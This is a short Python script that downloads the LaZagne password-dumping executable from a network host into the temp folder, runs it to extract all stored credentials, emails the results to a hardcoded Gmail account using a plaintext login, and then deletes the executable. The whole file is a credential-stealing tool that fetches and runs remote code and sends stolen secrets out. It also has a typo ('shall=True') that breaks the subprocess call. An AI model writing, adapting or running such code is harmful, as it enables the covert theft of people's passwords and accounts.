#!/usr/bin/env python
import requests, subprocess, smtplib, os, tempfile


def sent_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


def download(url):
    get_request = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_request.content)


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download(r"http://192.168.0.1/LaZagne.exe")
result = subprocess.check_output(r"LaZagne.exe all", shall=True)
sent_mail("test10good@gmail.com", "goodgyme", result)
os.remove(r"LaZagne.exe")